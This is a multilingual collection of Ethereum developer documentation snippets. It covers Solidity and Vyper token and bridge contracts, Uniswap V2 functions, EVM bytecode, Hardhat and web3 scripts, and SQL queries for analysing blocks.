DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2\n```\n\n----------------------------------------\n\nTITLE: Defining Minimum Liquidity Constant in Solidity\nDESCRIPTION: Defines a constant for minimum liquidity tokens (1000) to prevent division by zero and ensure there's always some liquidity in the pool. These tokens are locked in the zero address.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public constant MINIMUM_LIQUIDITY = 10**3;\n```\n\n----------------------------------------\n\nTITLE: Approval or Owner Verification for Pizza NFT in Solidity\nDESCRIPTION: Internal view function that checks if an address is the owner or approved to transfer a specific Pizza NFT. Verifies three conditions: if spender is owner, directly approved, or an approved operator.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _isApprovedOrOwner(address spender, uint256 pizzaId)\n    internal\n    view\n    returns (bool)\n{\n    address owner = pizzaToOwner[pizzaId];\n    // Disable solium check because of\n    // https://github.com/duaraghav8/Solium/issues/175\n    // solium-disable-next-line operator-whitespace\n    return (spender == owner ||\n        this.getApproved(pizzaId) == spender ||\n        this.isApprovedForAll(owner, spender));\n}\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Corpus Collection\nDESCRIPTION: Command to run Echidna with a configuration file that enables corpus collection during testing.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test magic.sol --config config.yaml\n```\n\n----------------------------------------\n\nTITLE: Testing Event Emission with Waffle\nDESCRIPTION: Tests that verify the split function correctly emits Transfer events with the expected arguments using Waffle's emit matcher.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Emits event on the transfer to the first receiver\", async () => {\n  await expect(splitter.split({ value: 50 }))\n    .to.emit(splitter, \"Transfer\")\n    .withArgs(sender.address, receiver1.address, 25)\n})\n\nit(\"Emits event on the transfer to the second receiver\", async () => {\n  await expect(splitter.split({ value: 50 }))\n    .to.emit(splitter, \"Transfer\")\n    .withArgs(sender.address, receiver2.address, 25)\n})\n```\n\n----------------------------------------\n\nTITLE: REVERT Opcode (FD) Implementation\nDESCRIPTION: The REVERT opcode (FD) terminates execution, reverts state changes, and returns data to the caller. It's similar to RETURN but reverts all state changes while consuming minimal gas.\n\nLANGUAGE: solidity\nCODE:\n```\nrevert(mem[ost:ost+len-1])\n```\n\n----------------------------------------\n\nTITLE: Updating ERC-20 Deposit Balance in Bridge Contract\nDESCRIPTION: Updates the deposits data structure by subtracting the withdrawal amount for a specific L1-L2 token pair during the finalization of an ERC-20 withdrawal.\n\nLANGUAGE: solidity\nCODE:\n```\ndeposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Bytecode Segment - Solidity\nDESCRIPTION: This is a segment of the compiled bytecode of an ERC20 token contract implementation. It includes functions for token transfers, allowance management, and balance tracking. The code implements safety features like overflow checks and proper error handling.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n00008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Token Compliance Verification in Solidity\nDESCRIPTION: Verification code that checks if the L2 token is compliant with the required interface and if its L1 token address matches the one provided in the deposit message.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Check the target token is compliant and\n        // verify the deposited token on L1 matches the L2 deposited token representation here\n        if (\n            // slither-disable-next-line reentrancy-events\n            ERC165Checker.supportsInterface(_l2Token, 0x1d1d8b63) &&\n            _l1Token == IL2StandardERC20(_l2Token).l1Token()\n```\n\n----------------------------------------\n\nTITLE: Initializing Wallet Connection with useEffect in React\nDESCRIPTION: A React useEffect hook that initializes the wallet connection on component mount. It retrieves the current wallet connection status and sets up the wallet event listener.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n\n  addWalletListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Função de Planilha para Cálculo de Offset Hexadecimal em EVM Bytecode\nDESCRIPTION: Fórmula para planilha do Google que calcula o offset (deslocamento) hexadecimal de cada opcode em um contrato EVM, somando o tamanho do opcode atual ao offset anterior.\n\nLANGUAGE: spreadsheet\nCODE:\n```\n=dec2hex(hex2dec(A1)+B1)\n```\n\n----------------------------------------\n\nTITLE: Importing Predeploy Addresses Library for L2 Contract References\nDESCRIPTION: Imports a library containing the addresses of predeployed contracts on L2, including the standard bridge. These addresses are constant and used to facilitate communication with known L2 contracts.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { Lib_PredeployAddresses } from \"../../libraries/constants/Lib_PredeployAddresses.sol\";\n```\n\n----------------------------------------\n\nTITLE: Running Contract Interaction Script on Goerli Network\nDESCRIPTION: Command to execute the interaction script targeting the Goerli testnet. This allows the script to connect to the correct network where the contract is deployed.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/interact.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Signing and Submitting NFT Transactions with Error Handling\nDESCRIPTION: This code builds upon the previous snippet by adding transaction signing with the private key and submitting the signed transaction to the network. It includes comprehensive error handling to track transaction status and outputs the transaction hash for verification.\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst PUBLIC_KEY = process.env.PUBLIC_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\n\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n\nconst contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\")\nconst contractAddress = \"0x81c587EB0fE773404c42c1d2666b5f557C470eED\"\nconst nftContract = new web3.eth.Contract(contract.abi, contractAddress)\n\nasync function mintNFT(tokenURI) {\n  const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, \"latest\") //get latest nonce\n\n  //the transaction\n  const tx = {\n    from: PUBLIC_KEY,\n    to: contractAddress,\n    nonce: nonce,\n    gas: 500000,\n    data: nftContract.methods.mintNFT(PUBLIC_KEY, tokenURI).encodeABI(),\n  }\n\n  const signPromise = web3.eth.accounts.signTransaction(tx, PRIVATE_KEY)\n  signPromise\n    .then((signedTx) => {\n      web3.eth.sendSignedTransaction(\n        signedTx.rawTransaction,\n        function (err, hash) {\n          if (!err) {\n            console.log(\n              \"The hash of your transaction is: \",\n              hash,\n              \"\\nCheck Alchemy's Mempool to view the status of your transaction!\"\n            )\n          } else {\n            console.log(\n              \"Something went wrong when submitting your transaction:\",\n              err\n            )\n          }\n        }\n      )\n    })\n    .catch((err) => {\n      console.log(\" Promise failed:\", err)\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: Inicializando Web3 y el contrato inteligente\nDESCRIPTION: Código para crear una instancia de Web3 conectada al nodo local y una instancia del contrato DAI utilizando el ABI y la dirección definidos anteriormente.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"http://localhost:8545\")\n\nconst daiToken = new web3.eth.Contract(ERC20TransferABI, DAI_ADDRESS)\n```\n\n----------------------------------------\n\nTITLE: Implementing Pair Constructor in Uniswap\nDESCRIPTION: Constructor for the pair contract. Sets the factory address by capturing the message sender, which should be the factory that created this pair.\n\nLANGUAGE: solidity\nCODE:\n```\nconstructor() public {\n    factory = msg.sender;\n}\n```\n\n----------------------------------------\n\nTITLE: CrossDomainEnabled Contract Implementation in Solidity\nDESCRIPTION: Defines the core CrossDomainEnabled contract that enables cross-domain communications. It includes state variables, constructor, and base functionality for cross-layer messaging.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title CrossDomainEnabled\n * @dev Helper contract for contracts performing cross-domain communications\n *\n * Compiler used: defined by inheriting contract\n */\ncontract CrossDomainEnabled {\n    /*************\n     * Variables *\n     *************/\n\n    // Messenger contract used to send and receive messages from the other domain.\n    address public messenger;\n\n    /***************\n     * Constructor *\n     ***************/\n\n    /**\n     * @param _messenger Address of the CrossDomainMessenger on the current layer.\n     */\n    constructor(address _messenger) {\n        messenger = _messenger;\n    }\n```\n\n----------------------------------------\n\nTITLE: Retrieving Average Daily Gas Limit in Ethereum Blocks\nDESCRIPTION: SQL query that retrieves the average gas limit per day for Ethereum blocks. This query helps visualize the supply side of Ethereum's block space, showing how the maximum capacity of blocks has changed over time.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_limit) AS avg_block_gas_limit\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: EVM Implementation of Token Balance Checking\nDESCRIPTION: This snippet shows the EVM bytecode for checking token balances. It retrieves the token balance of a specified address from storage.\n\nLANGUAGE: evm\nCODE:\n```\nPUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Constructor Implementation in Solidity\nDESCRIPTION: The constructor initializes the token with its name and symbol. It also sets the decimal places to 18 by default (matching Ether's divisibility). These values can only be set once during contract creation.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n     * a default value of 18.\n     *\n     * To select a different value for {decimals}, use {_setupDecimals}.\n     *\n     * All three of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor (string memory name_, string memory symbol_) public {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = 18;\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Internal removeTokenFrom Helper for ERC-721 in Vyper\nDESCRIPTION: Internal function that removes a token from an owner's balance by updating the ownership mapping and token count.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _removeTokenFrom(_from: address, _tokenId: uint256):\n    \"\"\"\n    @dev Remove a NFT from a given address\n         Throws if `_from` is not the current owner.\n    \"\"\"\n    # Throws if `_from` is not the current owner\n    assert self.idToOwner[_tokenId] == _from\n    # Change the owner\n    self.idToOwner[_tokenId] = ZERO_ADDRESS\n    # Change count tracking\n    self.ownerToNFTokenCount[_from] -= 1\n```\n\n----------------------------------------\n\nTITLE: Getting Maximum Mint Limit in ERC-4626 Vault\nDESCRIPTION: This method returns the maximum amount of shares that can be minted in a single mint call to the specified receiver address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxMint(address receiver) public view returns (uint256 maxShares)\n```\n\n----------------------------------------\n\nTITLE: ERC-721 Token Management Helper Functions in Vyper\nDESCRIPTION: Internal functions for adding, removing, and clearing approvals for tokens during transfer operations.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _addTokenTo(_to: address, _tokenId: uint256):\n    \"\"\"\n    @dev Add a NFT to a given address\n         Throws if `_tokenId` is owned by someone.\n    \"\"\"\n    # Throws if `_tokenId` is owned by someone\n    assert self.idToOwner[_tokenId] == ZERO_ADDRESS\n    # Change the owner\n    self.idToOwner[_tokenId] = _to\n    # Change count tracking\n    self.ownerToNFTokenCount[_to] += 1\n\n\n@internal\ndef _removeTokenFrom(_from: address, _tokenId: uint256):\n    \"\"\"\n    @dev Remove a NFT from a given address\n         Throws if `_from` is not the current owner.\n    \"\"\"\n    # Throws if `_from` is not the current owner\n    assert self.idToOwner[_tokenId] == _from\n    # Change the owner\n    self.idToOwner[_tokenId] = ZERO_ADDRESS\n    # Change count tracking\n    self.ownerToNFTokenCount[_from] -= 1\n\n\n@internal\ndef _clearApproval(_owner: address, _tokenId: uint256):\n    \"\"\"\n    @dev Clear an approval of a given address\n         Throws if `_owner` is not the current owner.\n    \"\"\"\n    # Throws if `_owner` is not the current owner\n    assert self.idToOwner[_tokenId] == _owner\n    if self.idToApprovals[_tokenId] != ZERO_ADDRESS:\n        # Reset approvals\n        self.idToApprovals[_tokenId] = ZERO_ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Implementing L2StandardERC20 for Bridge-Compatible Layer 2 Tokens\nDESCRIPTION: Layer 2'de kullanılan ve köprü tarafından yönetilen standart ERC-20 token uygulaması. Bu sözleşme, sadece yetkili köprü sözleşmesinin token basmasına ve yakmasına izin vererek, L1'deki kilitli token miktarıyla L2'deki token miktarının eşit kalmasını sağlar.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"./IL2StandardERC20.sol\";\n\ncontract L2StandardERC20 is IL2StandardERC20, ERC20 {\n    address public l1Token;\n    address public l2Bridge;\n\n    /**\n     * @param _l2Bridge Address of the L2 standard bridge.\n     * @param _l1Token Address of the corresponding L1 token.\n     * @param _name ERC20 name.\n     * @param _symbol ERC20 symbol.\n     */\n    constructor(\n        address _l2Bridge,\n        address _l1Token,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) {\n        l1Token = _l1Token;\n        l2Bridge = _l2Bridge;\n    }\n\n    modifier onlyL2Bridge() {\n        require(msg.sender == l2Bridge, \"Only L2 Bridge can mint and burn\");\n        _;\n    }\n\n\n    // slither-disable-next-line external-function\n    function supportsInterface(bytes4 _interfaceId) public pure returns (bool) {\n        bytes4 firstSupportedInterface = bytes4(keccak256(\"supportsInterface(bytes4)\")); // ERC165\n        bytes4 secondSupportedInterface = IL2StandardERC20.l1Token.selector ^\n            IL2StandardERC20.mint.selector ^\n            IL2StandardERC20.burn.selector;\n        return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;\n    }\n\n    // slither-disable-next-line external-function\n    function mint(address _to, uint256 _amount) public virtual onlyL2Bridge {\n        _mint(_to, _amount);\n\n        emit Mint(_to, _amount);\n    }\n\n    // slither-disable-next-line external-function\n    function burn(address _from, uint256 _amount) public virtual onlyL2Bridge {\n        _burn(_from, _amount);\n\n        emit Burn(_from, _amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up for Liquidity Withdrawal in Uniswap V2\nDESCRIPTION: Prepares for liquidity withdrawal by retrieving the current reserves, token addresses, balances, and the amount of liquidity tokens to be burned. The peripheral contract transfers the liquidity tokens to this contract before the call.\n\nLANGUAGE: solidity\nCODE:\n```\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n```\n\n----------------------------------------\n\nTITLE: Abbreviazione dei messaggi di errore in Solidity\nDESCRIPTION: Esempio di come abbreviare i messaggi di errore per ridurre le dimensioni del contratto. Sostituendo messaggi di errore lunghi con codici brevi, è possibile risparmiare spazio significativo nel bytecode del contratto.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(msg.sender == owner, \"Only the owner of this contract can call this function\");\n```\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(msg.sender == owner, \"OW1\");\n```\n\n----------------------------------------\n\nTITLE: Installation de create-eth-app avec Yarn\nDESCRIPTION: Commandes pour installer et démarrer une nouvelle application avec create-eth-app. Nécessite Yarn 0.25 ou supérieur comme prérequis.\n\nLANGUAGE: bash\nCODE:\n```\nyarn create eth-app my-eth-app\ncd my-eth-app\nyarn react-app:start\n```\n\n----------------------------------------\n\nTITLE: Reading Data from Ethereum Smart Contract\nDESCRIPTION: Asynchronous function that reads the message stored in the HelloWorld smart contract by calling the message function and logs it to the console.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Importing ethers.js using ES6 modules in Browser\nDESCRIPTION: HTML script tag that imports ethers.js as an ES6 module from a CDN for browser-based applications.\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"module\">\n  import { ethers } from \"https://cdn.ethers.io/lib/ethers-5.0.esm.min.js\"\n  // Your code here...\n</script>\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Faucet Function in Solidity\nDESCRIPTION: A simple faucet function added to a standard ERC-20 contract that allows any user to obtain tokens for testing purposes. The function mints 1000 tokens and sends them to the caller.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Gives the caller 1000 tokens to play with\n */\nfunction faucet() external {\n    _mint(msg.sender, 1000);\n}   // function faucet\n```\n\n----------------------------------------\n\nTITLE: Total Supply Function in ERC20 Contract\nDESCRIPTION: This function implements the IERC20 totalSupply interface requirement and returns the total number of tokens in circulation.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n```\n\n----------------------------------------\n\nTITLE: Configuring Pinata API Keys with dotenv in Node.js\nDESCRIPTION: Code snippet that imports environment variables from a .env file to securely access Pinata API credentials. This is used for uploading NFT metadata to IPFS.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n```\n\n----------------------------------------\n\nTITLE: RETURN Opcode in EVM\nDESCRIPTION: Returns data from the specified memory range to the caller of the current context.\n\nLANGUAGE: evm assembly\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Calculating Token Exchange Rate Without Fees in UniswapV2Library\nDESCRIPTION: Pure function that calculates the equivalent amount of one token given an amount of another token and the pair reserves. This calculation doesn't account for swap fees and assumes a fee-less exchange.\n\nLANGUAGE: solidity\nCODE:\n```\n    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    }\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Library and Contract Imports in Solidity\nDESCRIPTION: Imports additional libraries and contracts needed for the L2 Standard Bridge functionality, including OpenZeppelin's ERC165 checker and cross-domain communication utilities.\n\nLANGUAGE: solidity\nCODE:\n```\n/* Library Imports */\nimport { ERC165Checker } from \"@openzeppelin/contracts/utils/introspection/ERC165Checker.sol\";\nimport { CrossDomainEnabled } from \"../../libraries/bridge/CrossDomainEnabled.sol\";\nimport { Lib_PredeployAddresses } from \"../../libraries/constants/Lib_PredeployAddresses.sol\";\n\n/* Contract Imports */\nimport { IL2StandardERC20 } from \"../../standards/IL2StandardERC20.sol\";\n\n/**\n * @title L2StandardBridge\n * @dev The L2 Standard bridge is a contract which works together with the L1 Standard bridge to\n * enable ETH and ERC20 transitions between L1 and L2.\n * This contract acts as a minter for new tokens when it hears about deposits into the L1 Standard\n * bridge.\n * This contract also acts as a burner of the tokens intended for withdrawal, informing the L1\n * bridge to release L1 funds.\n */\ncontract L2StandardBridge is IL2ERC20Bridge, CrossDomainEnabled {\n    /********************************\n     * External Contract References *\n     ********************************/\n\n    address public l1TokenBridge;\n```\n\n----------------------------------------\n\nTITLE: Manejo de Etiquetas HTML en Traducciones\nDESCRIPTION: Este fragmento muestra cómo deben manejarse las etiquetas HTML al traducir contenido en la plataforma Crowdin para ethereum.org. Las etiquetas no deben traducirse, solo el texto entre ellas.\n\nLANGUAGE: html\nCODE:\n```\n<0>texto para traducir</0>\n```\n\n----------------------------------------\n\nTITLE: Script de Despliegue para Contrato HelloWorld con Hardhat y Ethers.js\nDESCRIPTION: Script que utiliza ethers.js para desplegar el contrato HelloWorld en la blockchain. El script obtiene una instancia de ContractFactory, despliega el contrato con un mensaje inicial, y muestra la dirección del contrato desplegado.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n   const HelloWorld = await ethers.getContractFactory(\"HelloWorld\");\n\n   // Start deployment, returning a promise that resolves to a contract object\n   const hello_world = await HelloWorld.deploy(\"Hello World!\");\n   console.log(\"Contract deployed to address:\", hello_world.address);}\n\nmain()\n  .then(() => process.exit(0))\n  .catch(error => {\n    console.error(error);\n    process.exit(1);\n  });\n```\n\n----------------------------------------\n\nTITLE: Counting Successful Transactions in an Ethereum Block\nDESCRIPTION: SQL query that counts the number of successful transactions in a specific Ethereum block (12396854), helping analyze the success rate of transaction verification.\n\nLANGUAGE: SQL\nCODE:\n```\nWITH temp_table AS (\n    SELECT * FROM ethereum.\"transactions\"\n    WHERE block_number = 12396854 AND success = true\n    ORDER BY block_time DESC\n)\nSELECT\n    COUNT(success) AS num_successful_txn\nFROM temp_table\n```\n\n----------------------------------------\n\nTITLE: Reserve Data Access Function in Uniswap V2\nDESCRIPTION: Provides public access to the current state of the pool, returning the token reserves and last update timestamp in a single call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n    _reserve0 = reserve0;\n    _reserve1 = reserve1;\n    _blockTimestampLast = blockTimestampLast;\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Cache Deduplication in Solidity\nDESCRIPTION: Test function that verifies the cache doesn't duplicate values by writing the same value multiple times and ensuring that the key remains the same.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Cache the same value multiple times, ensure that the key stays\n    // the same\n    function testRepeatCaching() public {\n        for(uint i=1; i<100; i++) {\n            uint _key1 = cache.cacheWrite(i);\n            uint _key2 = cache.cacheWrite(i);\n            assertEq(_key1, _key2);\n        }\n        for(uint i=1; i<100; i+=3) {\n            uint _key = cache.cacheWrite(i);\n            assertEq(_key, i);\n        }\n    }    // testRepeatCaching\n```\n\n----------------------------------------\n\nTITLE: Paramètres pour eth_getBalance en JavaScript\nDESCRIPTION: Exemple de paramètres pour la méthode eth_getBalance qui prend l'adresse du compte à vérifier et le numéro de bloc ou un tag spécial.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\"0x407d73d8a49eeb85d32cf465507dd71d507100c1\", \"latest\"]\n```\n\n----------------------------------------\n\nTITLE: Implementing _beforeTokenTransfer Hook in ERC-20 Contract\nDESCRIPTION: Overriding the _beforeTokenTransfer hook in an ERC-20 contract to add custom functionality. This function gets called before any token transfer and can be used to implement transfer validations.\n\nLANGUAGE: solidity\nCODE:\n```\n    function _beforeTokenTransfer(address from, address to, uint256 amount)\n        internal virtual\n        override(ERC20)\n    {\n        super._beforeTokenTransfer(from, to, amount);\n    }\n```\n\n----------------------------------------\n\nTITLE: Listing Ethereum Block Numbers in Plaintext Format\nDESCRIPTION: A comma-separated array of Ethereum block numbers. These numbers represent heights/positions in the Ethereum blockchain, potentially used for tracking, analysis, or processing specific blocks in a development or research context.\n\nLANGUAGE: plaintext\nCODE:\n```\n189791936, 189923264, 190054208, 190182848, 190315072, 190447424,\n190577984, 190709312, 190840768, 190971328, 191102656, 191233472,\n191364032, 191495872, 191626816, 191758016, 191888192, 192020288,\n192148928, 192282176, 192413504, 192542528, 192674752, 192805952,\n192937792, 193068608, 193198912, 193330496, 193462208, 193592384,\n193723456, 193854272, 193985984, 194116672, 194247232, 194379712,\n194508352, 194641856, 194772544, 194900672, 195035072, 195166016,\n195296704, 195428032, 195558592, 195690304, 195818176, 195952576,\n196083392, 196214336, 196345792, 196476736, 196607552, 196739008,\n196869952, 197000768, 197130688, 197262784, 197394368, 197523904,\n197656384, 197787584, 197916608, 198049472, 198180544, 198310208,\n198442432, 198573632, 198705088, 198834368, 198967232, 199097792,\n199228352, 199360192, 199491392, 199621696, 199751744, 199883968,\n200014016, 200146624, 200276672, 200408128, 200540096, 200671168,\n200801984, 200933312, 201062464, 201194944, 201326144, 201457472,\n201588544, 201719744, 201850816, 201981632, 202111552, 202244032,\n202374464, 202505152, 202636352, 202767808, 202898368, 203030336,\n203159872, 203292608, 203423296, 203553472, 203685824, 203816896,\n203947712, 204078272, 204208192, 204341056, 204472256, 204603328,\n204733888, 204864448, 204996544, 205125568, 205258304, 205388864,\n205517632, 205650112, 205782208, 205913536, 206044736, 206176192,\n206307008, 206434496, 206569024, 206700224, 206831168, 206961856,\n207093056, 207223616, 207355328, 207486784, 207616832, 207749056,\n207879104, 208010048, 208141888, 208273216, 208404032, 208534336,\n208666048, 208796864, 208927424, 209059264, 209189824, 209321792,\n209451584, 209582656, 209715136, 209845568, 209976896, 210106432,\n210239296, 210370112, 210501568, 210630976, 210763712, 210894272,\n211024832, 211156672, 211287616, 211418176, 211549376, 211679296,\n211812032, 211942592, 212074432, 212204864, 212334016, 212467648,\n212597824, 212727616, 212860352, 212991424, 213120832, 213253952,\n213385024, 213515584, 213645632, 213777728, 213909184, 214040128,\n214170688, 214302656, 214433728, 214564544, 214695232, 214826048,\n214956992, 215089088, 215219776, 215350592, 215482304, 215613248,\n215743552, 215874752, 216005312, 216137024, 216267328, 216399296,\n216530752, 216661696, 216790592, 216923968, 217054528, 217183168,\n217316672, 217448128, 217579072, 217709504, 217838912, 217972672,\n218102848, 218233024, 218364736, 218496832, 218627776, 218759104,\n218888896, 219021248, 219151936, 219281728, 219413056, 219545024,\n219675968, 219807296, 219938624, 220069312, 220200128, 220331456,\n220461632, 220592704, 220725184, 220855744, 220987072, 221117888,\n221249216, 221378368, 221510336, 221642048, 221772736, 221904832,\n222031808, 222166976, 222297536, 222428992, 222559936, 222690368,\n222820672, 222953152, 223083968, 223213376, 223345984, 223476928,\n223608512, 223738688, 223869376, 224001472, 224132672, 224262848,\n224394944, 224524864, 224657344, 224788288, 224919488, 225050432,\n225181504, 225312704, 225443776, 225574592, 225704768, 225834176,\n225966784, 226097216, 226229824, 226360384, 226491712, 226623424,\n226754368, 226885312, 227015104, 227147456, 227278528, 227409472,\n227539904, 227669696, 227802944, 227932352, 228065216, 228196288,\n228326464, 228457792, 228588736, 228720064, 228850112, 228981056,\n229113152, 229243328, 229375936, 229505344, 229636928, 229769152,\n229894976, 230030272, 230162368, 230292416, 230424512, 230553152,\n230684864, 230816704, 230948416, 231079616, 231210944, 231342016,\n231472448, 231603776, 231733952, 231866176, 231996736, 232127296,\n232259392, 232388672, 